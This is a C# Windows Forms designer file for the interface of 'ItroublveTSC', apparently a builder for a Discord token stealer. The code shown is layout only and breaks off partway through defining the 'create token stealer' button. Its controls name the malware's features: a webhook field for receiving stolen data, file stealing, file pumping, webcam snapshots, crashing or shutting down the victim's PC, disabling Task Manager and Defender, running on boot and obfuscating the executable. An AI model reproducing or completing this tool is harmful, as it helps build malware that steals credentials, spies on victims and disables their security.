namespace ItroublveTSC
{
	public partial class frmMain : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			bool flag = disposing && components != null;
			bool flag2 = flag;
			if (flag2)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
            this.RainbowTimer = new System.Windows.Forms.Timer(this.components);
            this.HeadLinePnlInf = new System.Windows.Forms.Panel();
            this.button5 = new System.Windows.Forms.Button();
            this.pnlRainbowTop = new System.Windows.Forms.Panel();
            this.CloseBtn = new System.Windows.Forms.Button();
            this.HeadServerLbl = new System.Windows.Forms.Label();
            this.panel25 = new System.Windows.Forms.Panel();
            this.comboBox3 = new System.Windows.Forms.ComboBox();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.button4 = new System.Windows.Forms.Button();
            this.panel26 = new System.Windows.Forms.Panel();
            this.panel27 = new System.Windows.Forms.Panel();
            this.panel36 = new System.Windows.Forms.Panel();
            this.PnlRainbowDown = new System.Windows.Forms.Panel();
            this.WebHookTxt = new System.Windows.Forms.TextBox();
            this.WebhookPnl = new System.Windows.Forms.Panel();
            this.CustomExeTxt = new System.Windows.Forms.TextBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.cbBox = new System.Windows.Forms.ComboBox();
            this.HomeBtn = new System.Windows.Forms.Button();
            this.panel7 = new System.Windows.Forms.Panel();
            this.button6 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.CrashPCchkbox = new System.Windows.Forms.CheckBox();
            this.RestartPCchkbox = new System.Windows.Forms.CheckBox();
            this.ShutdownPCchkbox = new System.Windows.Forms.CheckBox();
            this.AutoRmvExe = new System.Windows.Forms.CheckBox();
            this.BootloopPCchckbox = new System.Windows.Forms.CheckBox();
            this.CustomEXEchkbox = new System.Windows.Forms.CheckBox();
            this.CheckboxPnl = new System.Windows.Forms.Panel();
            this.disableTskMgr = new System.Windows.Forms.CheckBox();
            this.pumpStealer = new System.Windows.Forms.CheckBox();
            this.avStart = new System.Windows.Forms.CheckBox();
            this.ObfEXE = new System.Windows.Forms.CheckBox();
            this.CamSnapchkbox = new System.Windows.Forms.CheckBox();
            this.WinInfo = new System.Windows.Forms.NotifyIcon(this.components);
            this.panel2 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();
            this.CreateTokenStealerBtn = new RoundBtn();
            this.HowToBtn = new RoundBtn();
            this.HeadLinePnlInf.SuspendLayout();
            this.WebhookPnl.SuspendLayout();
            this.panel1.SuspendLayout();
            this.panel7.SuspendLayout();
            this.CheckboxPnl.SuspendLayout();
            this.SuspendLayout();
            // 
            // RainbowTimer
            // 
            this.RainbowTimer.Tick += new System.EventHandler(this.RainbowTimer_Tick);
            // 
            // HeadLinePnlInf
            // 
            this.HeadLinePnlInf.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HeadLinePnlInf.Controls.Add(this.button5);
            this.HeadLinePnlInf.Controls.Add(this.pnlRainbowTop);
            this.HeadLinePnlInf.Controls.Add(this.CloseBtn);
            this.HeadLinePnlInf.Controls.Add(this.HeadServerLbl);
            this.HeadLinePnlInf.Controls.Add(this.panel25);
            this.HeadLinePnlInf.Controls.Add(this.comboBox3);
            this.HeadLinePnlInf.Controls.Add(this.textBox3);
            this.HeadLinePnlInf.Controls.Add(this.button4);
            this.HeadLinePnlInf.Controls.Add(this.panel26);
            this.HeadLinePnlInf.Controls.Add(this.panel27);
            this.HeadLinePnlInf.Controls.Add(this.panel36);
            this.HeadLinePnlInf.Dock = System.Windows.Forms.DockStyle.Top;
            this.HeadLinePnlInf.Location = new System.Drawing.Point(0, 0);
            this.HeadLinePnlInf.Name = "HeadLinePnlInf";
            this.HeadLinePnlInf.Size = new System.Drawing.Size(537, 27);
            this.HeadLinePnlInf.TabIndex = 6306;
            this.HeadLinePnlInf.MouseDown += new System.Windows.Forms.MouseEventHandler(this.HeadLinePnlInf_MouseDown);
            this.HeadLinePnlInf.MouseMove += new System.Windows.Forms.MouseEventHandler(this.HeadLinePnlInf_MouseMove);
            // 
            // button5
            // 
            this.button5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.button5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.button5.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(110)))), ((int)(((byte)(123)))));
            this.button5.FlatAppearance.BorderSize = 0;
            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button5.Font = new System.Drawing.Font("Impact", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))));
            this.button5.ForeColor = System.Drawing.Color.White;
            this.button5.Location = new System.Drawing.Point(480, 0);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(26, 25);
            this.button5.TabIndex = 6223;
            this.button5.Text = "-";
            this.button5.UseVisualStyleBackColor = false;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // pnlRainbowTop
            // 
            this.pnlRainbowTop.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.pnlRainbowTop.Location = new System.Drawing.Point(0, 25);
            this.pnlRainbowTop.Name = "pnlRainbowTop";
            this.pnlRainbowTop.Size = new System.Drawing.Size(3814, 2);
            this.pnlRainbowTop.TabIndex = 6222;
            // 
            // CloseBtn
            // 
            this.CloseBtn.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.CloseBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CloseBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(110)))), ((int)(((byte)(123)))));
            this.CloseBtn.FlatAppearance.BorderSize = 0;
            this.CloseBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CloseBtn.Font = new System.Drawing.Font("Webdings", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.CloseBtn.ForeColor = System.Drawing.Color.White;
            this.CloseBtn.Location = new System.Drawing.Point(512, 0);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(26, 25);
            this.CloseBtn.TabIndex = 6167;
            this.CloseBtn.Text = "r";
            this.CloseBtn.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.CloseBtn.UseVisualStyleBackColor = false;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // HeadServerLbl
            // 
            this.HeadServerLbl.AutoSize = true;
            this.HeadServerLbl.Font = new System.Drawing.Font("Microsoft Tai Le", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HeadServerLbl.ForeColor = System.Drawing.Color.White;
            this.HeadServerLbl.Location = new System.Drawing.Point(203, 3);
            this.HeadServerLbl.Name = "HeadServerLbl";
            this.HeadServerLbl.Size = new System.Drawing.Size(160, 21);
            this.HeadServerLbl.TabIndex = 6166;
            this.HeadServerLbl.Text = "ItroublveTSC | Main";
            this.HeadServerLbl.MouseDown += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseDown);
            this.HeadServerLbl.MouseMove += new System.Windows.Forms.MouseEventHandler(this.HeadServerLbl_MouseMove);
            // 
            // panel25
            // 
            this.panel25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel25.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel25.Location = new System.Drawing.Point(362, -44);
            this.panel25.Name = "panel25";
            this.panel25.Size = new System.Drawing.Size(2, 25);
            this.panel25.TabIndex = 6160;
            // 
            // comboBox3
            // 
            this.comboBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.comboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox3.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold);
            this.comboBox3.ForeColor = System.Drawing.Color.Silver;
            this.comboBox3.FormattingEnabled = true;
            this.comboBox3.Location = new System.Drawing.Point(364, -44);
            this.comboBox3.Name = "comboBox3";
            this.comboBox3.Size = new System.Drawing.Size(254, 25);
            this.comboBox3.TabIndex = 6154;
            // 
            // textBox3
            // 
            this.textBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox3.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox3.ForeColor = System.Drawing.Color.White;
            this.textBox3.Location = new System.Drawing.Point(364, -42);
            this.textBox3.Multiline = true;
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(231, 21);
            this.textBox3.TabIndex = 6156;
            this.textBox3.Text = " Voice Channel";
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(68)))), ((int)(((byte)(173)))));
            this.button4.FlatAppearance.BorderSize = 0;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Webdings", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(2)));
            this.button4.ForeColor = System.Drawing.Color.Silver;
            this.button4.Location = new System.Drawing.Point(594, -43);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(25, 22);
            this.button4.TabIndex = 6155;
            this.button4.Text = "6";
            this.button4.UseVisualStyleBackColor = false;
            // 
            // panel26
            // 
            this.panel26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel26.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel26.Location = new System.Drawing.Point(364, -21);
            this.panel26.Name = "panel26";
            this.panel26.Size = new System.Drawing.Size(254, 2);
            this.panel26.TabIndex = 6157;
            // 
            // panel27
            // 
            this.panel27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel27.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel27.Location = new System.Drawing.Point(364, -44);
            this.panel27.Name = "panel27";
            this.panel27.Size = new System.Drawing.Size(254, 2);
            this.panel27.TabIndex = 6158;
            // 
            // panel36
            // 
            this.panel36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.panel36.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.panel36.Location = new System.Drawing.Point(617, -44);
            this.panel36.Name = "panel36";
            this.panel36.Size = new System.Drawing.Size(2, 25);
            this.panel36.TabIndex = 6159;
            // 
            // PnlRainbowDown
            // 
            this.PnlRainbowDown.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
            this.PnlRainbowDown.Location = new System.Drawing.Point(-1631, 480);
            this.PnlRainbowDown.Name = "PnlRainbowDown";
            this.PnlRainbowDown.Size = new System.Drawing.Size(3814, 2);
            this.PnlRainbowDown.TabIndex = 6307;
            // 
            // WebHookTxt
            // 
            this.WebHookTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebHookTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.WebHookTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WebHookTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.WebHookTxt.Location = new System.Drawing.Point(7, 7);
            this.WebHookTxt.Name = "WebHookTxt";
            this.WebHookTxt.Size = new System.Drawing.Size(379, 18);
            this.WebHookTxt.TabIndex = 6153;
            this.WebHookTxt.Text = "Webhook Here";
            this.WebHookTxt.Enter += new System.EventHandler(this.WebHookTxt_Enter);
            this.WebHookTxt.Leave += new System.EventHandler(this.WebHookTxt_Leave);
            // 
            // WebhookPnl
            // 
            this.WebhookPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.WebhookPnl.Controls.Add(this.WebHookTxt);
            this.WebhookPnl.Location = new System.Drawing.Point(111, 53);
            this.WebhookPnl.Name = "WebhookPnl";
            this.WebhookPnl.Size = new System.Drawing.Size(395, 33);
            this.WebhookPnl.TabIndex = 6308;
            // 
            // CustomExeTxt
            // 
            this.CustomExeTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.CustomExeTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.CustomExeTxt.Enabled = false;
            this.CustomExeTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.CustomExeTxt.ForeColor = System.Drawing.Color.DarkGray;
            this.CustomExeTxt.Location = new System.Drawing.Point(7, 7);
            this.CustomExeTxt.Name = "CustomExeTxt";
            this.CustomExeTxt.Size = new System.Drawing.Size(302, 18);
            this.CustomExeTxt.TabIndex = 6153;
            this.CustomExeTxt.Text = "Custom File Link Here";
            this.CustomExeTxt.Enter += new System.EventHandler(this.CustomExeTxt_Enter);
            this.CustomExeTxt.Leave += new System.EventHandler(this.CustomExeTxt_Leave);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.panel1.Controls.Add(this.cbBox);
            this.panel1.Controls.Add(this.CustomExeTxt);
            this.panel1.Location = new System.Drawing.Point(111, 101);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(395, 33);
            this.panel1.TabIndex = 6331;
            // 
            // cbBox
            // 
            this.cbBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.cbBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cbBox.ForeColor = System.Drawing.Color.White;
            this.cbBox.FormattingEnabled = true;
            this.cbBox.Items.AddRange(new object[] {
            ".exe",
            ".bat",
            ".txt",
            ".png",
            ".zip",
            ".psd",
            ".mp3",
            ".mp4",
            ".pdf"});
            this.cbBox.Location = new System.Drawing.Point(315, 4);
            this.cbBox.Name = "cbBox";
            this.cbBox.Size = new System.Drawing.Size(77, 21);
            this.cbBox.TabIndex = 6154;
            this.cbBox.Visible = false;
            // 
            // HomeBtn
            // 
            this.HomeBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.HomeBtn.FlatAppearance.BorderSize = 0;
            this.HomeBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.HomeBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HomeBtn.ForeColor = System.Drawing.Color.White;
            this.HomeBtn.ImageAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.HomeBtn.Location = new System.Drawing.Point(0, 0);
            this.HomeBtn.Name = "HomeBtn";
            this.HomeBtn.Size = new System.Drawing.Size(95, 87);
            this.HomeBtn.TabIndex = 6341;
            this.HomeBtn.Text = "Stealer";
            this.HomeBtn.UseVisualStyleBackColor = true;
            // 
            // panel7
            // 
            this.panel7.Controls.Add(this.button6);
            this.panel7.Controls.Add(this.button3);
            this.panel7.Controls.Add(this.button2);
            this.panel7.Controls.Add(this.HomeBtn);
            this.panel7.Controls.Add(this.button1);
            this.panel7.Location = new System.Drawing.Point(0, 28);
            this.panel7.Name = "panel7";
            this.panel7.Size = new System.Drawing.Size(95, 451);
            this.panel7.TabIndex = 6342;
            // 
            // button6
            // 
            this.button6.FlatAppearance.BorderSize = 0;
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button6.ForeColor = System.Drawing.Color.White;
            this.button6.Location = new System.Drawing.Point(0, 393);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(95, 58);
            this.button6.TabIndex = 6346;
            this.button6.Text = "Credits";
            this.button6.UseVisualStyleBackColor = true;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // button3
            // 
            this.button3.FlatAppearance.BorderSize = 0;
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.ForeColor = System.Drawing.Color.White;
            this.button3.Location = new System.Drawing.Point(0, 197);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(95, 93);
            this.button3.TabIndex = 6345;
            this.button3.Text = "File  Stealer";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // button2
            // 
            this.button2.FlatAppearance.BorderSize = 0;
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button2.ForeColor = System.Drawing.Color.White;
            this.button2.Location = new System.Drawing.Point(0, 90);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(95, 101);
            this.button2.TabIndex = 6344;
            this.button2.Text = "Advanced Options";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Location = new System.Drawing.Point(0, 296);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(95, 91);
            this.button1.TabIndex = 6343;
            this.button1.Text = "File Pumper";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // CrashPCchkbox
            // 
            this.CrashPCchkbox.AccessibleName = "CrashPCchkbox";
            this.CrashPCchkbox.AutoSize = true;
            this.CrashPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CrashPCchkbox.Location = new System.Drawing.Point(10, 18);
            this.CrashPCchkbox.Name = "CrashPCchkbox";
            this.CrashPCchkbox.Size = new System.Drawing.Size(70, 17);
            this.CrashPCchkbox.TabIndex = 6328;
            this.CrashPCchkbox.Text = "Crash PC";
            this.CrashPCchkbox.UseVisualStyleBackColor = true;
            // 
            // RestartPCchkbox
            // 
            this.RestartPCchkbox.AccessibleName = "RestartPCchkbox";
            this.RestartPCchkbox.AutoSize = true;
            this.RestartPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.RestartPCchkbox.Location = new System.Drawing.Point(148, 18);
            this.RestartPCchkbox.Name = "RestartPCchkbox";
            this.RestartPCchkbox.Size = new System.Drawing.Size(77, 17);
            this.RestartPCchkbox.TabIndex = 6329;
            this.RestartPCchkbox.Text = "Restart PC";
            this.RestartPCchkbox.UseVisualStyleBackColor = true;
            // 
            // ShutdownPCchkbox
            // 
            this.ShutdownPCchkbox.AccessibleName = "ShutdownPCchkbox";
            this.ShutdownPCchkbox.AutoSize = true;
            this.ShutdownPCchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.ShutdownPCchkbox.Location = new System.Drawing.Point(148, 51);
            this.ShutdownPCchkbox.Name = "ShutdownPCchkbox";
            this.ShutdownPCchkbox.Size = new System.Drawing.Size(91, 17);
            this.ShutdownPCchkbox.TabIndex = 6330;
            this.ShutdownPCchkbox.Text = "Shutdown PC";
            this.ShutdownPCchkbox.UseVisualStyleBackColor = true;
            // 
            // AutoRmvExe
            // 
            this.AutoRmvExe.AccessibleName = "CrashPCchkbox";
            this.AutoRmvExe.AutoSize = true;
            this.AutoRmvExe.ForeColor = System.Drawing.SystemColors.Window;
            this.AutoRmvExe.Location = new System.Drawing.Point(10, 51);
            this.AutoRmvExe.Name = "AutoRmvExe";
            this.AutoRmvExe.Size = new System.Drawing.Size(115, 17);
            this.AutoRmvExe.TabIndex = 6332;
            this.AutoRmvExe.Text = "Auto Remove EXE";
            this.AutoRmvExe.UseVisualStyleBackColor = true;
            // 
            // BootloopPCchckbox
            // 
            this.BootloopPCchckbox.AccessibleName = "RestartDiscordchkbox";
            this.BootloopPCchckbox.AutoSize = true;
            this.BootloopPCchckbox.ForeColor = System.Drawing.SystemColors.Window;
            this.BootloopPCchckbox.Location = new System.Drawing.Point(10, 85);
            this.BootloopPCchckbox.Name = "BootloopPCchckbox";
            this.BootloopPCchckbox.Size = new System.Drawing.Size(99, 17);
            this.BootloopPCchckbox.TabIndex = 6333;
            this.BootloopPCchckbox.Text = "Restart Discord";
            this.BootloopPCchckbox.UseVisualStyleBackColor = true;
            // 
            // CustomEXEchkbox
            // 
            this.CustomEXEchkbox.AccessibleName = "CustomExechkbox";
            this.CustomEXEchkbox.AutoSize = true;
            this.CustomEXEchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CustomEXEchkbox.Location = new System.Drawing.Point(148, 85);
            this.CustomEXEchkbox.Name = "CustomEXEchkbox";
            this.CustomEXEchkbox.Size = new System.Drawing.Size(80, 17);
            this.CustomEXEchkbox.TabIndex = 6334;
            this.CustomEXEchkbox.Text = "Custom File";
            this.CustomEXEchkbox.UseVisualStyleBackColor = true;
            this.CustomEXEchkbox.CheckedChanged += new System.EventHandler(this.CustomEXEchkbox_CheckedChanged);
            // 
            // CheckboxPnl
            // 
            this.CheckboxPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
            this.CheckboxPnl.Controls.Add(this.disableTskMgr);
            this.CheckboxPnl.Controls.Add(this.pumpStealer);
            this.CheckboxPnl.Controls.Add(this.avStart);
            this.CheckboxPnl.Controls.Add(this.ObfEXE);
            this.CheckboxPnl.Controls.Add(this.CamSnapchkbox);
            this.CheckboxPnl.Controls.Add(this.CustomEXEchkbox);
            this.CheckboxPnl.Controls.Add(this.BootloopPCchckbox);
            this.CheckboxPnl.Controls.Add(this.AutoRmvExe);
            this.CheckboxPnl.Controls.Add(this.ShutdownPCchkbox);
            this.CheckboxPnl.Controls.Add(this.RestartPCchkbox);
            this.CheckboxPnl.Controls.Add(this.CrashPCchkbox);
            this.CheckboxPnl.Location = new System.Drawing.Point(111, 166);
            this.CheckboxPnl.Name = "CheckboxPnl";
            this.CheckboxPnl.Size = new System.Drawing.Size(252, 237);
            this.CheckboxPnl.TabIndex = 6329;
            // 
            // disableTskMgr
            // 
            this.disableTskMgr.AccessibleName = "Disable Task Manager";
            this.disableTskMgr.AutoSize = true;
            this.disableTskMgr.ForeColor = System.Drawing.SystemColors.Window;
            this.disableTskMgr.Location = new System.Drawing.Point(10, 156);
            this.disableTskMgr.Name = "disableTskMgr";
            this.disableTskMgr.Size = new System.Drawing.Size(133, 17);
            this.disableTskMgr.TabIndex = 6340;
            this.disableTskMgr.Text = "Disable Task Manager";
            this.disableTskMgr.UseVisualStyleBackColor = true;
            this.disableTskMgr.CheckStateChanged += new System.EventHandler(this.disableTskMgr_CheckStateChanged);
            // 
            // pumpStealer
            // 
            this.pumpStealer.AccessibleName = "File Pumper";
            this.pumpStealer.AutoSize = true;
            this.pumpStealer.ForeColor = System.Drawing.SystemColors.Window;
            this.pumpStealer.Location = new System.Drawing.Point(148, 156);
            this.pumpStealer.Name = "pumpStealer";
            this.pumpStealer.Size = new System.Drawing.Size(81, 17);
            this.pumpStealer.TabIndex = 6339;
            this.pumpStealer.Text = "File Pumper";
            this.pumpStealer.UseVisualStyleBackColor = true;
            // 
            // avStart
            // 
            this.avStart.AccessibleName = "CamSnapShot";
            this.avStart.AutoSize = true;
            this.avStart.ForeColor = System.Drawing.SystemColors.Window;
            this.avStart.Location = new System.Drawing.Point(10, 189);
            this.avStart.Name = "avStart";
            this.avStart.Size = new System.Drawing.Size(183, 30);
            this.avStart.TabIndex = 6338;
            this.avStart.Text = "Disable Defender + Run on Boot \r\n(Requires admin)";
            this.avStart.UseVisualStyleBackColor = true;
            this.avStart.CheckStateChanged += new System.EventHandler(this.avStart_CheckStateChanged);
            // 
            // ObfEXE
            // 
            this.ObfEXE.AccessibleName = "CamSnapShot";
            this.ObfEXE.AutoSize = true;
            this.ObfEXE.ForeColor = System.Drawing.SystemColors.Window;
            this.ObfEXE.Location = new System.Drawing.Point(148, 119);
            this.ObfEXE.Name = "ObfEXE";
            this.ObfEXE.Size = new System.Drawing.Size(99, 17);
            this.ObfEXE.TabIndex = 6336;
            this.ObfEXE.Text = "Obfuscate EXE";
            this.ObfEXE.UseVisualStyleBackColor = true;
            // 
            // CamSnapchkbox
            // 
            this.CamSnapchkbox.AccessibleName = "CamSnapShot";
            this.CamSnapchkbox.AutoSize = true;
            this.CamSnapchkbox.ForeColor = System.Drawing.SystemColors.Window;
            this.CamSnapchkbox.Location = new System.Drawing.Point(10, 119);
            this.CamSnapchkbox.Name = "CamSnapchkbox";
            this.CamSnapchkbox.Size = new System.Drawing.Size(110, 17);
            this.CamSnapchkbox.TabIndex = 6335;
            this.CamSnapchkbox.Text = "Camera Snapshot";
            this.CamSnapchkbox.UseVisualStyleBackColor = true;
            // 
            // WinInfo
            // 
            this.WinInfo.BalloonTipTitle = "ItroublveTSC";
            this.WinInfo.Icon = ((System.Drawing.Icon)(resources.GetObject("WinInfo.Icon")));
            this.WinInfo.Text = "ItroublveTSC";
            this.WinInfo.Visible = true;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.panel2.Location = new System.Drawing.Point(369, 403);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(140, 22);
            this.panel2.TabIndex = 6332;
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.panel3.Location = new System.Drawing.Point(372, 140);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(133, 25);
            this.panel3.TabIndex = 6333;
            // 
            // CreateTokenStealerBtn
            // 
            this.CreateTokenStealerBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.BorderSize = 0;
            this.CreateTokenStealerBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.CreateTokenStealerBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CreateTokenStealerBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
            this.CreateTokenStealerBtn.Location = new System.Drawing.Point(111, 431);
            this.CreateTokenStealerBtn.Name = "CreateTokenStealerBtn";
            this.CreateTokenStealerBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
